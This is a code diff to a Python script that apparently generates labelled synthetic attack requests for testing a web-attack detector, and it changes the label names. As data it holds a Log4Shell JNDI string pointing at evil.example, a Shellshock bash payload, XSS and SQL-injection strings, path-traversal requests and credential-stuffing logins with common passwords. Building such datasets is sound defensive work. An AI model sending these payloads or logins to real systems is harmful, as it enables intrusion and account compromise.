@@ -171,30 +171,30 @@ def inject(label, payloads, per=2, tags=()):
             add(label, "GET", host, sp, f"{key}={quote(pl, safe='%')}", browser_headers(host, ua, referer=f"https://{host}/", xhr=True), tags=["query", *tags])
 
 
-inject("sqli", SQLI, per=2)
+inject("injection", SQLI, per=2)
 inject("xss", XSS, per=2)
-inject("rce", RCE, per=2)
+inject("injection", RCE, per=2)
 for pl in TRAVERSAL:
     for _ in range(2):
         host = random.choice(hosts)
         if random.random() < 0.5:
-            add("path_traversal", "GET", host, "/api/v1/download", f"file={quote(pl, safe='%')}", browser_headers(host, random.choice(BROWSERS), xhr=True), tags=["query"])
+            add("file_access", "GET", host, "/api/v1/download", f"file={quote(pl, safe='%')}", browser_headers(host, random.choice(BROWSERS), xhr=True), tags=["query"])
         else:
-            add("path_traversal", "GET", host, "/static/" + pl.replace("%", "%25") if "%" in pl else "/static/" + pl, headers=browser_headers(host, random.choice(BROWSERS)), tags=["path"])
+            add("file_access", "GET", host, "/static/" + pl.replace("%", "%25") if "%" in pl else "/static/" + pl, headers=browser_headers(host, random.choice(BROWSERS)), tags=["path"])
 for p in SCANNER_PATHS:
     host = random.choice(hosts)
-    add("scanner", "GET", host, p, headers={"user-agent": [random.choice(SCANNER_UAS + [CHROME])], "accept": ["*/*"]}, tags=["path"])
+    add("recon", "GET", host, p, headers={"user-agent": [random.choice(SCANNER_UAS + [CHROME])], "accept": ["*/*"]}, tags=["path"])
 for ua in SCANNER_UAS:
     host = random.choice(hosts)
-    add("scanner", "GET", host, random.choice(["/", "/robots.txt", "/admin", "/login"]), headers={"user-agent": [ua], "accept": ["*/*"]}, tags=["ua"])
+    add("recon", "GET", host, random.choice(["/", "/robots.txt", "/admin", "/login"]), headers={"user-agent": [ua], "accept": ["*/*"]}, tags=["ua"])
 for pl in ["${jndi:ldap://evil.example/x}", "() { :; }; /bin/bash -c 'id'", "<script>alert(1)</script>", "' OR 1=1--"]:
     for host in random.sample(hosts, 3):
         h = browser_headers(host, pl if random.random() < 0.5 else CHROME)
         h["x-api-version"] = [pl]
-        add("rce" if ("jndi" in pl or "bash" in pl) else ("xss" if "script" in pl else "sqli"), "GET", host, "/", headers=h, tags=["header"])
+        add("xss" if "script" in pl else "injection", "GET", host, "/", headers=h, tags=["header"])
 for user in ["admin", "root", "administrator", "test", "guest", "jsmith", "user1", "support"]:
     host = random.choice(["auth.example.com", "vaultwarden.example.com", "forgejo.example.com", "homeassistant.example.com"])
-    add("credential_stuffing", "POST", host, "/api/user/login" if host.startswith("auth") else "/identity/connect/token" if host.startswith("vault") else "/user/login" if host.startswith("forgejo") else "/auth/login_flow",
+    add("auth_abuse", "POST", host, "/api/user/login" if host.startswith("auth") else "/identity/connect/token" if host.startswith("vault") else "/user/login" if host.startswith("forgejo") else "/auth/login_flow",
         f"username={user}&password={quote(random.choice(['123456', 'password1', 'admin', 'Summer2026!', 'qwerty']))}", {"user-agent": [random.choice(["python-requests/2.32.4", "Go-http-client/1.1", "Hydra v9.6"])], "content-type": ["application/x-www-form-urlencoded"], "accept": ["*/*"]}, tags=["query"])
 
 out = sys.argv[1]
